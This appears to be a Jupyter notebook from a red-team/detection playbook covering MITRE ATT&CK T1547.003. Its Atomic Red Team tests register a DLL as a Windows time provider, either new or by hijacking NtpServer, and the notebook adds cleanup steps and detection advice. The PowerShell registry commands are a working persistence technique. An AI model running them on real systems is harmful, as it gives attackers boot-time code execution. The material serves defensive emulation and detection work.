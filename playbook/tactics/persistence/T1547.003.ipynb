{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "f591e545",
   "metadata": {},
   "source": "# T1547.003 - Time Providers\nAdversaries may abuse time providers to execute DLLs when the system boots. The Windows Time service (W32Time) enables time synchronization across and within domains.(Citation: Microsoft W32Time Feb 2018) W32Time time providers are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients.(Citation: Microsoft TimeProvider)\n\nTime providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys of  <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\</code>.(Citation: Microsoft TimeProvider) The time provider manager, directed by the service control manager, loads and starts time providers listed and enabled under this key at system startup and/or whenever parameters are changed.(Citation: Microsoft TimeProvider)\n\nAdversaries may abuse this architecture to establish persistence, specifically by registering and enabling a malicious DLL as a time provider. Administrator privileges are required for time provider registration, though execution will run in context of the Local Service account.(Citation: Github W32Time Oct 2017)"
  },
  {
   "cell_type": "markdown",
   "id": "1d5acde4",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "9040045a",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Create a new time provider",
    "Establishes persistence by creating a new time provider registry key under HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProvider.\nThe new time provider will point to a DLL which will be loaded after the w32time service is started. The DLL will then create the file AtomicTest.txt\nin C:\\Users\\Public\\ as validation that the test is successful.\n\nPayload source code: https://github.com/tr4cefl0w/payloads/tree/master/T1547.003/\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nnet stop w32time\nCopy-Item \"$PathToAtomicsFolder\\T1547.003\\bin\\AtomicTest.dll\" C:\\Users\\Public\\AtomicTest.dll\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest\" /t REG_SZ /v \"DllName\" /d \"C:\\Users\\Public\\AtomicTest.dll\" /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest\" /t REG_DWORD /v \"Enabled\" /d \"1\" /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest\" /t REG_DWORD /v \"InputProvider\" /d \"1\" /f\nnet start w32time\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e7a18a3c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1547.003 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "692077d1",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nnet stop w32time\nreg delete \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest\" /f\nrm -force C:\\Users\\Public\\AtomicTest.dll\nnet start w32time\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3325be88",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1547.003 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "8f5e902b",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Edit an existing time provider",
    "Establishes persistence by editing the NtpServer time provider registry key under HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProvider.\nThe time provider will point to a DLL which will be loaded after the w32time service is started. The DLL will then create the file AtomicTest.txt\nin C:\\Users\\Public\\ as validation that the test is successful.\n\nPayload source code: https://github.com/tr4cefl0w/payloads/tree/master/T1547.003/\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nnet stop w32time\nCopy-Item \"$PathToAtomicsFolder\\T1547.003\\bin\\AtomicTest.dll\" C:\\Users\\Public\\AtomicTest.dll\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_SZ /v \"DllName\" /d \"C:\\Users\\Public\\AtomicTest.dll\" /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_DWORD /v \"Enabled\" /d \"1\" /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_DWORD /v \"InputProvider\" /d \"1\" /f\nnet start w32time\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9dd632d6",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1547.003 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "6de64aae",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nnet stop w32time\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_SZ /v \"DllName\" /d \"C:\\Windows\\SYSTEM32\\w32time.DLL\" /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_DWORD /v \"Enabled\" /d \"0\" /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_DWORD /v \"InputProvider\" /d \"0\" /f\nrm -force C:\\Users\\Public\\AtomicTest.dll\nnet start w32time\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2bb30b62",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1547.003 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "81a298a4",
   "metadata": {},
   "source": "## Detection\nBaseline values and monitor/analyze activity related to modifying W32Time information in the Registry, including application programming interface (API) calls such as <code>RegCreateKeyEx</code> and <code>RegSetValueEx</code> as well as execution of the W32tm.exe utility.(Citation: Microsoft W32Time May 2017) There is no restriction on the number of custom time providers registrations, though each may require a DLL payload written to disk.(Citation: Github W32Time Oct 2017)\n\nThe Sysinternals Autoruns tool may also be used to analyze auto-starting locations, including DLLs listed as time providers.(Citation: TechNet Autoruns)"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}